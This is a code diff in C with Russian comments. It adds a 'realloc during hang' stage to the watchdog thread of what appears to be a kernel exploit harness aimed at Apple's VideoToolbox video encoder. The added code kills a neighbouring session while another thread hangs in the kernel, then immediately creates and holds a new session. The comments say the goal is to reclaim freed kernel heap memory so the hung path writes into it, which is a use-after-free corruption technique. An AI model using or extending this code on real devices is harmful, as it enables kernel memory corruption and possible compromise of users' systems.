@@ -43751,9 +43751,13 @@ static void *bq85_storm(void *arg) {
 }
 
 // Монитор: heartbeat-детектор — если поток не стучался > hang_ms,
-// он СЕЙЧАС в kernel hang → соседу kill_now → teardown ВРЕМЯ hang.
+// он СЕЙЧАС в kernel hang → соседу kill_now → teardown ВРЕМЯ hang →
+// НЕМЕДЛЕННО создаём ТРЕТЬЮ сессию (реаллокация freed kernel memory!)
+// → когда hang отпускает, зависший путь пишет в ЧУЖУЮ память.
 static void *bq85_watchdog(void *arg) {
     bq85_thr *thrs = (bq85_thr *)arg;   // [2]
+    bq83_ctx *c = thrs[0].ctx;
+    int realloc_count = 0;
     for (;;) {
         usleep(10000);   // 10мс опрос
         uint64_t now = bq85_now_ns();
@@ -43766,10 +43770,54 @@ static void *bq85_watchdog(void *arg) {
                 if (thrs[other].session && !thrs[other].kill_now) {
                     thrs[other].kill_now = 1;
                     thrs[i].teardowns_during_hang++;
-                    LOG("[bq85] watchdog: t%d HUNG (%lldмс без heartbeat) "
-                        "→ KILL t%d (teardown соседа ВО ВРЕМЯ kernel "
-                        "hang!)", i,
-                        (long long)((now - hb) / 1000000ULL), other);
+                    LOG("[bq85] watchdog: t%d HUNG (%lldмс) → KILL t%d",
+                        i, (long long)((now - hb) / 1000000ULL), other);
+
+                    // === v243: REALLOC-ВО-ВРЕМЯ-HANG ===
+                    // Сосед убит → его kernel ресурсы освобождены.
+                    // Немедленно создаём НОВУЮ сессию → kernel выделяет
+                    // память из того же heap → если совпадёт с freed →
+                    // когда hang отпустит, зависший путь БУДЕТ писать
+                    // в нашу новую память = kernel corruption.
+                    if (realloc_count < 20) {
+                        realloc_count++;
+                        VTCompressionSessionRef rs = NULL;
+                        OSStatus st = bq83_create(&rs, 1280, 720, c);
+                        if (st == noErr && rs) {
+                            LOG("[bq85] REALLOC #%d: третья сессия "
+                                "создана ВО ВРЕМЯ hang (kernel heap "
+                                "reuse!)", realloc_count);
+                            bq83_apply_mctf(rs, 12, 0, 0, 0);
+                            bq83_setnum(rs, CFSTR("RealTime"), 1);
+                            bq83_setnum(rs, CFSTR("AverageBitRate"),
+                                        500000);
+                            bq83_setnum(rs, CFSTR("MaxKeyFrameInterval"),
+                                        30);
+                            // encode 1 кадр → kernel должен выделить
+                            // SVE/DPB/CHM из heap
+                            bool le = false;
+                            if (bq83_encode_one(rs, 1280, 720, 0, 0, &le, 0)
+                                == noErr) {
+                                LOG("[bq85] REALLOC #%d: кадр отправлен "
+                                    "— kernel heap REALLOCATED во время "
+                                    "hang!", realloc_count);
+                            }
+                            // ДЕРЖИМ сессию живой — не teardown!
+                            // Пусть зависший путь напишет в ЕЁ память
+                            // когда hang отпустит.
+                            // Сессия освободится при следующем цикле
+                            // watchdog (kill_now не для неё).
+                            usleep(500000);   // 500мс держим
+                            VTCompressionSessionInvalidate(rs);
+                            CFRelease(rs);
+                            LOG("[bq85] REALLOC #%d: сессия "
+                                "освобождена после 500мс", realloc_count);
+                        } else {
+                            LOG("[bq85] REALLOC #%d: create FAILED %d "
+                                "(kernel hang не пускает?)",
+                                realloc_count, (int)st);
+                        }
+                    }
                 }
             }
         }
